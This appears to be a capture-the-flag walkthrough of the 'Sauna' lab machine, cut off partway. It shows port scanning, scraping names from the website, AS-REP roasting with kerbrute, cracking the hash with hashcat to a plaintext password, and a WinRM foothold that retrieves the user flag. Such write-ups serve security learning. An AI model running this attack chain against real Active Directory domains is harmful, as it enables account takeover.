Target : 10.129.95.180

```bash
>  nmap -Pn -sS -sV -sC -O -p- --min-rate=3000 -T4 10.129.95.180  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-23 08:54 +0200  
Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 99.96% done; ETC: 08:57 (0:00:00 remaining)  
Nmap scan report for sauna.htb (10.129.95.180)  
Host is up (0.086s latency).  
Not shown: 65518 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
|_http-server-header: Microsoft-IIS/10.0  
|_http-title: Egotistical Bank :: Home  
| http-methods:    
|_  Potentially risky methods: TRACE  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-23 13:56:26Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49674/tcp open  msrpc         Microsoft Windows RPC  
49676/tcp open  msrpc         Microsoft Windows RPC  
49692/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)  
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10  
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: 6h59m59s  
| smb2-time:    
|   date: 2026-05-23T13:57:22  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 191.15 seconds
```

Port 88 is open (Kerberos) ; ports 389 and 3268 are open under the Active Directory "Domain: EGOTISTICAL-BANK.LOCAL", port 80 (http) is open as Microsoft IIS httpd 10.0 and port 445 is also open (SMB) with "smb2-security-mode: 3.1.1: Message signing enabled and required". 

So we'll try a few options to map the surface attack :

```bash
>  smbclient -N -L //10.129.95.180  
Anonymous login successful  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
SMB1 disabled -- no workgroup available

>  enum4linux -U -M -S -P 10.129.95.180  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 23 09:09:37 2026  
  
=========================================( Target Information )=========================================  
  
Target ........... 10.129.95.180  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
  
  
===========================( Enumerating Workgroup/Domain on 10.129.95.180 )===========================  
  
          
[E] Can't find workgroup/domain  
  
  
  
===================================( Session Check on 10.129.95.180 )===================================  
  
  
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.  
  
>  enum4linux -U -S -d -o -a 10.129.95.180  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 23 09:10:40 2026  
  
=========================================( Target Information )=========================================  
  
Target ........... 10.129.95.180  
RID Range ........ 500-550,1000-1050  
Username ......... ''  
Password ......... ''  
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none  
  
  
===========================( Enumerating Workgroup/Domain on 10.129.95.180 )===========================  
  
  
[E] Can't find workgroup/domain  
  
  
  
===============================( Nbtstat Information for 10.129.95.180 )===============================  
  
Looking up status of 10.129.95.180  
No reply from 10.129.95.180  
  
===================================( Session Check on 10.129.95.180 )===================================  
  
  
[+] Server 10.129.95.180 allows sessions using username '', password ''  
  
  
================================( Getting domain SID for 10.129.95.180 )================================  
  
Domain Name: EGOTISTICALBANK  
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766  
  
[+] Host is part of a domain (not a workgroup)  
  
  
==================================( OS information on 10.129.95.180 )==================================  
  
  
[E] Can't get OS info with smbclient  
  
  
[+] Got OS info for 10.129.95.180 from srvinfo:    
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED  
  
  
=======================================( Users on 10.129.95.180 )=======================================  
  
  
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED  
  
  
  
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED  
  
  
=================================( Share Enumeration on 10.129.95.180 )=================================  
  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
SMB1 disabled -- no workgroup available  
  
[+] Attempting to map shares on 10.129.95.180  
  
  
===========================( Password Policy Information for 10.129.95.180 )===========================  
  
Password:    
  
[E] Unexpected error from polenum:  
  
  
  
[+] Attaching to 10.129.95.180 using a NULL share  
  
[+] Trying protocol 139/SMB...  
  
       [!] Protocol failed: Cannot request session (Called Name:10.129.95.180)  
  
[+] Trying protocol 445/SMB...  
  
       [!] Protocol failed: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.  
  
  
  
[E] Failed to get password policy with rpcclient  
  
  
  
======================================( Groups on 10.129.95.180 )======================================  
  
  
[+] Getting builtin groups:  
  
  
[+]  Getting builtin group memberships:  
  
  
[+]  Getting local groups:  
  
  
[+]  Getting local group memberships:  
  
  
[+]  Getting domain groups:  
  
  
[+]  Getting domain group memberships:  
  
  
==================( Users on 10.129.95.180 via RID cycling (RIDS: 500-550,1000-1050) )==================  
  
  
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.  
  
  
===============================( Getting printer info for 10.129.95.180 )===============================  
  
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED  
  
  
enum4linux complete on Sat May 23 09:11:17 2026
```

The name EGOTISTICAL-BANK points to a Bank-like web application, we'll see if this is just hypothesis or actual evidence after adding them to the hosts :

```bash
╰─ sudo echo "10.129.95.180 sauna.htb EGOTISTICAL-BANK.LOCAL egotistical-bank.local" | sudo tee -a /etc/hosts
```

We then go on `http://egotistical-bank.local/` and are indeed met with a Bank web app.

Starting enumerating directories :

```bash
>  gobuster dir -u http://egotistical-bank.local/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://egotistical-bank.local/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
images               (Status: 301) [Size: 160] [--> http://egotistical-bank.local/images/]  
css                  (Status: 301) [Size: 157] [--> http://egotistical-bank.local/css/]  
Images               (Status: 301) [Size: 160] [--> http://egotistical-bank.local/Images/]  
fonts                (Status: 301) [Size: 159] [--> http://egotistical-bank.local/fonts/]  
CSS                  (Status: 301) [Size: 157] [--> http://egotistical-bank.local/CSS/]  
Css                  (Status: 301) [Size: 157] [--> http://egotistical-bank.local/Css/]  
IMAGES               (Status: 301) [Size: 160] [--> http://egotistical-bank.local/IMAGES/]  
Fonts                (Status: 301) [Size: 159] [--> http://egotistical-bank.local/Fonts/]  
error_log           (Status: 400) [Size: 324]  
Progress: 29999 / 29999 (100.00%)  
===============================================================  
Finished  
===============================================================
```

Both didn't give anything really interesting.

Trying ffuf :

```bash
>  ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://egotistical-bank.local:80/ -H 'Host: FUZZ.egotistical-bank.local' -ac  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://egotistical-bank.local:80/  
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  
:: Header           : Host: FUZZ.egotistical-bank.local  
:: Follow redirects : false  
:: Calibration      : true  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________  
  
:: Progress: [20000/20000] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

Nothing for vhosts.

We'll try to find what's inside the actual web application using `grep -oiE` and not `grep -iE` because we don't want to get the full HTML line from the href regex.

```bash
>  curl -sL http://egotistical-bank.local/ | grep -oiE 'href="[^"]+"' | sort -u  
href="#"  
href="about.html"  
href="blog.html"  
href="contact.html"  
href="css/bootstrap.css"  
href="css/font-awesome.css"  
href="css/slider.css"  
href="css/style.css"  
href="//fonts.googleapis.com/css?family=Catamaran:100,200,300,400,500,600,700,800"  
href="#home"  
href="http://w3layouts.com/"  
href="index.html"  
href="mailto:example@email.com"  
href="#process"  
href="#services"  
href="single.html"  
href="#stats"  
href="#test"
```

Now, we have some surface.

Time to hunt for some emails from the bank users since this is Active Directory.

```bash
>  curl -sL http://egotistical-bank.local/contact.html | grep -oiE '[a-zA-Z0-9._%+-]+@egotistical-bank\.local'
  
>  curl -sL http://egotistical-bank.local/blog.html | grep -oiE '[a-zA-Z0-9._%+-]+@egotistical-bank\.local'
  
>  curl -sL http://egotistical-bank.local/index.html | grep -oiE '[a-zA-Z0-9._%+-]+@egotistical-bank\.local'  
  
>  curl -sL http://egotistical-bank.local/single.html | grep -oiE '[a-zA-Z0-9._%+-]+@egotistical-bank\.local'  
  
>  curl -sL http://egotistical-bank.local/about.html | grep -oiE '[a-zA-Z0-9._%+-]+@egotistical-bank\.local'
```

Nothing.

```bash
>  curl -sL http://egotistical-bank.local/about.html | grep -oiE 'src="[^"]+"' | sort -u  
  
src="images/ab.jpg"  
src="images/banner1.jpg"  
src="images/banner2.jpg"  
src="images/banner3.jpg"  
src="images/skill1.jpg"  
src="images/skill2.jpg"  
src="images/t1.jpg"  
src="images/t2.jpg"  
src="images/t3.jpg"  
src="images/t4.jpg"  
src="images/te1.jpg"  
src="images/te2.jpg"

>  curl -sL http://egotistical-bank.local/about.html | sed 's/<[^>]*>/\n/g' | grep -v '^[[:space:]]*$' | grep -iE 'chief|officer|manager|director|account|user|@|bank|team|[A-Z][a-z]+ [A-Z][a-z]+' | head -40  
  
Author URL: http://w3layouts.com  
License: Creative Commons Attribution 3.0 Unported  
License URL: http://creativecommons.org/licenses/by/3.0/  
Egotistical Bank :: About  
       function hideURLbar() {  
About Us  
Our Team  
Contact Us  
Apply Now  
Small Business Loans  
                       For a Daily Expenses  
Integer sit amet mattis quam, sit amet ultricies velit. Praesent ullamcorper dui turpis.Donec malesuada ex sit amet pretium sid ornare. Nulla congue scelerisque tellus, utpretium nulla malesuada sedint. Suspend  
isse venenatis  
Personal Loan @ 10.75%  
Repayable in 12 to 60 EMIs  
Business Loan  
                           @ 11.65%  
Home Loan  
                           @ 7.75%  
Credit & Debit Card  
                           @ 5.15%  
Check Your Rate  
Donec malesuada ex sit amet pretium sid ornare. Nulla congue scelerisque tellus, utpretium nulla malesuada sedint.  
                       Suspendisse venenatis  
Choose Your Loan  
Donec malesuada ex sit amet pretium sid ornare. Nulla congue scelerisque tellus, utpretium nulla malesuada sedint.  
                       Suspendisse venenatis  
Get Your Funds  
Donec malesuada ex sit amet pretium sid ornare. Nulla congue scelerisque tellus, utpretium nulla malesuada sedint.  
                       Suspendisse venenatis  
Previous Record  
Personal Loan  
Fixed Deposit  
Savings Account  
Credit Cards  
Our Skills  
Simple Websites  
Online Marketing  
Social Media  
Helping Your Business Reach
```

Since our research was inconclusive for emails, we'll look for names.

```bash

>  curl -sL http://egotistical-bank.local/about.html | grep -oP '<p class="mt-2">\K[^<]+' | sort -u  
  
Auto Loan    
Bowie Taylor    
Business Loan    
Education Loan    
Fergus Smith    
Home Loan    
Hugo Bear    
Personal Loan    
Shaun Coins    
Sophie Driver    
Steven Kerb
```

And we got some names.

We make a .txt file with `Bowie Taylor, Fergus Smith, Hugo Bear, Shaun Coins, Sophie Driver and Steven Kerb`.

Then, we "anarchize" the names so they can fit in lowercase, with their initial and their last name, for AD kerberoasting.

```bash
> username-anarchy -i /home/vagabond/saunanames.txt --select-format first,flast,first.last,firstl | sort -u > saunaunames.txt

>  kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.95.180 saunaunames.txt  
  
  
   __             __               __        
  / /_____  _____/ /_  _______  __/ /____    
 / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                           
  
Version: dev (n/a) - 05/23/26 - Ronnie Flathers @ropnop  
  
2026/05/23 10:35:43 >  Using KDC(s):  
2026/05/23 10:35:43 >   10.129.95.180:88  
  
2026/05/23 10:35:43 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:  
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:ad515ad675e5caf896f3be61fed6d99a$39427d7bd8c1e1c8ae5a537b2bd8b647b9da915d870ae3422512da096eb5e113db6e623a8edd9cbc1cd63676a15fde5310d33dd76525105dca930b2ff74a855deb1ce  
58db57411cc3b6b48853625a0ca3a7d5572998a331eed32d0fb61707a1516b13ad9dbfb83a8400070b9f10ba15e305ffe92b76b98619ffc44af77ece502252c73a23a79c328f3f5aa26272bd039320561e2bbcdfdfa73d0d5d1e8136e6d842efba58c8fc3086a34711  
7ceda3d3f57473fb91b67d4b751894daf661efe8cc3ac89ed6d286535078223ef6c6fff724feefda529d7cabaf7c3c4cbf15baf81d3a6344a8f8e7c5448f4c00c920b5aacbc7b5766a15f761d717af03862d5e1c040712167cb4f0b7208a514963b8c43434da66d128  
562  
2026/05/23 10:35:43 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL  
2026/05/23 10:35:43 >  Done! Tested 24 usernames (1 valid) in 0.218 seconds
```

We got `fsmith@EGOTISTICAL-BANK.LOCAL` and `$krb5asrep` hash.
```bash
>  hashcat -m 18200 fsmith_asrep.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/doc/hashcat/rules/best66.rule --force  
hashcat (v7.1.2) starting  
  
You have enabled --force to bypass dangerous warnings and errors!  
This can hide serious problems and should only be done when debugging.  
Do not report hashcat issues encountered when using --force.  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashfile 'fsmith_asrep.hash' on line 1 (@EGOTI...0b7208a514963b8c43434da66d128562): Separator unmatched  
No hashes loaded.
```

Wrong hash formatting :
```
  
Started: Sat May 23 10:48:45 2026  
Stopped: Sat May 23 10:48:46 2026  
>  head -c 120 fsmith_asrep.hash  
  
@EGOTISTICAL-BANK.LOCAL:ad515ad675e5caf896f3be61fed6d99ad7bd8c1e1c8ae5a537b2bd8b647b9da915d870ae3422512da096eb5e113db6e6%
```

So we print the whole hash :

```bash                                                                                  
>  printf '%s\n' '$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:ad515ad675e5caf896f3be61fed6d99a$39427d7bd8c1e1c8ae5a537b2bd8b647b9da915d870ae3422512da096eb5e113db6e623a8edd9cbc1cd63676a15fde5310d33dd76525105dca9  
30b2ff74a855deb1ce58db57411cc3b6b48853625a0ca3a7d5572998a331eed32d0fb61707a1516b13ad9dbfb83a8400070b9f10ba15e305ffe92b76b98619ffc44af77ece502252c73a23a79c328f3f5aa26272bd039320561e2bbcdfdfa73d0d5d1e8136e6d842ef  
ba58c8fc3086a347117ceda3d3f57473fb91b67d4b751894daf661efe8cc3ac89ed6d286535078223ef6c6fff724feefda529d7cabaf7c3c4cbf15baf81d3a6344a8f8e7c5448f4c00c920b5aacbc7b5766a15f761d717af03862d5e1c040712167cb4f0b7208a5149  
63b8c43434da66d128562  
' > fsmith_asrep.hash

>  hashcat -m 18200 fsmith_asrep.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/doc/hashcat/rules/best66.rule --force  
hashcat (v7.1.2) starting  
  
You have enabled --force to bypass dangerous warnings and errors!  
This can hide serious problems and should only be done when debugging.  
Do not report hashcat issues encountered when using --force.  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 66  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12944 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 946729344  
  
Cracking performance lower than expected?                    
  
* Append -O to the commandline.  
 This lowers the maximum supported password/salt length (usually down to 32).  
  
* Append -w 3 to the commandline.  
 This can cause your screen to lag.  
  
* Append -S to the commandline.  
 This has a drastic speed impact but can be better for specific attacks.  
 Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
 https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
 https://hashcat.net/faq/morework  
  
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>

Session..........: hashcat  
Status...........: Running  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:ad515ad...128562  
Time.Started.....: Sat May 23 10:52:39 2026, (3 mins, 58 secs)  
Time.Estimated...: Sat May 23 11:02:27 2026, (5 mins, 50 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Mod........: Rules (/usr/share/doc/hashcat/rules/best66.rule)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1604.7 kH/s (9.64ms) @ Accel:62 Loops:64 Thr:1 Vec:8  
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)  
Progress.........: 385073568/946729344 (40.67%)  
Rejected.........: 0/385073568 (0.00%)  
Restore.Point....: 5834448/14344384 (40.67%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64  
Candidate.Engine.: Device Generator  
Candidates.#01...: manda1020 -> nted  
Hardware.Mon.#01.: Temp: 71c Util: 80%

Approaching final keyspace - workload adjusted.              
  
Session..........: hashcat                                   
Status...........: Exhausted  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:ad515ad...128562  
Time.Started.....: Sat May 23 10:52:39 2026, (9 mins, 41 secs)  
Time.Estimated...: Sat May 23 11:02:20 2026, (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Mod........: Rules (/usr/share/doc/hashcat/rules/best66.rule)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1647.6 kH/s (9.16ms) @ Accel:62 Loops:64 Thr:1 Vec:8  
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)  
Progress.........: 946729344/946729344 (100.00%)  
Rejected.........: 0/946729344 (0.00%)  
Restore.Point....: 14344384/14344384 (100.00%)  
Restore.Sub.#01..: Salt:0 Amplifier:64-66 Iteration:0-64  
Candidate.Engine.: Device Generator  
Candidates.#01...:  yara -> amosamos  
Hardware.Mon.#01.: Temp: 71c Util: 77%  
  
Started: Sat May 23 10:52:38 2026  
Stopped: Sat May 23 11:02:22 2026
```

The crack failed.

```bash
>  hashcat -m 18200 fsmith_asrep.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --force  
  
hashcat (v7.1.2) starting  
  
You have enabled --force to bypass dangerous warnings and errors!  
This can hide serious problems and should only be done when debugging.  
Do not report hashcat issues encountered when using --force.  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12552 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfaaa2d9e135412344a47ed18ade14ac$523d6f84ed7b410593e7255d664e2277ae5d9c6bb9564023e54e4606c853b60a92e7c7b90963572d113cc267b9d17749312cda9c6bcde92549cbf0e64b0676e99c2c2  
3646901133961a0e1c011df078b9ed290d931a405394c0e17fdc41797778598f9fa0eeb59a231273e5d0dc3cd229a35ec49a13beb1bec981b74f89f8458b33748c7a961e78a68b95fa50255f8ce4aa407769de48147b05e0de80d45e900bf33bdf05932a4d7c2450dd  
a5722aff9cd7f1df33132d574353e12d4bef953c0dbbfec461cbbfbe99c5a1f61d5d4fcf7cf4597eba4570fa76a1aa54a439f4fe9cc25d2e17d024e6ae89c908d4455e455db461912d9eca38bc01ded91a9b341e5:Thestrokes23  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)  
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfaaa2d...b341e5  
Time.Started.....: Sat May 23 11:13:11 2026, (5 secs)  
Time.Estimated...: Sat May 23 11:13:16 2026, (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:  1818.7 kH/s (3.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 10543104/14344384 (73.50%)  
Rejected.........: 0/10543104 (0.00%)  
Restore.Point....: 10534912/14344384 (73.44%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: Tiona172 -> Teague  
Hardware.Mon.#01.: Temp: 70c Util: 68%  
  
Started: Sat May 23 11:13:10 2026  
Stopped: Sat May 23 11:13:18 2026
```

Cracked : Thestrokes23

Time to get foothold.

```bash
>  evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls  
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls -al  
A parameter cannot be found that matches parameter name 'al'.  
At line:1 char:4  
+ ls -al  
+    ~~~  
   + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem], ParameterBindingException  
   + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand  
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd /  
*Evil-WinRM* PS C:\> ls  
  
  
   Directory: C:\  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        1/23/2020   8:48 AM                inetpub  
d-----        9/15/2018  12:19 AM                PerfLogs  
d-r---        7/13/2021  10:54 AM                Program Files  
d-----        1/23/2020   3:11 PM                Program Files (x86)  
d-r---        1/24/2020   4:05 PM                Users  
d-----        7/14/2021   3:28 PM                Windows  
  
  
*Evil-WinRM* PS C:\> cd Users  
*Evil-WinRM* PS C:\Users> ls  
  
  
   Directory: C:\Users  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----        1/25/2020   1:05 PM                Administrator  
d-----        1/23/2020   9:52 AM                FSmith  
d-r---        1/22/2020   9:32 PM                Public  
d-----        1/24/2020   4:05 PM                svc_loanmgr  
  
  
*Evil-WinRM* PS C:\Users> cd FSmith  
*Evil-WinRM* PS C:\Users\FSmith> ls  
  
  
   Directory: C:\Users\FSmith  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-r---        1/23/2020  10:01 AM                Desktop  
d-r---        1/24/2020  10:40 AM                Documents  
d-r---        9/15/2018  12:19 AM                Downloads  
d-r---        9/15/2018  12:19 AM                Favorites  
d-r---        9/15/2018  12:19 AM                Links  
d-r---        9/15/2018  12:19 AM                Music  
d-r---        9/15/2018  12:19 AM                Pictures  
d-----        9/15/2018  12:19 AM                Saved Games  
d-r---        9/15/2018  12:19 AM                Videos  
  
  
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop  
*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls  
  
  
   Directory: C:\Users\FSmith\Desktop  
  
  
Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
-ar---        5/23/2026   6:51 AM             34 user.txt  
  
  
*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt  
40df63de1a116ee304c2f7cbc07df1f0
```

And we got the user flag.

We try to peek into the other user and some intel gathering :

```PowerShell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir C:\Users\svc_loanmgr  
Access to the path 'C:\Users\svc_loanmgr' is denied.  
At line:1 char:1  
+ dir C:\Users\svc_loanmgr  
+ ~~~~~~~~~~~~~~~~~~~~~~~~  
   + CategoryInfo          : PermissionDenied: (C:\Users\svc_loanmgr:String) [Get-ChildItem], UnauthorizedAccessException  
   + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

*Evil-WinRM* PS C:\Users\FSmith\Desktop> whoami /all  
*  
USER INFORMATION  
----------------  
  
User Name              SID  
====================== ==============================================  
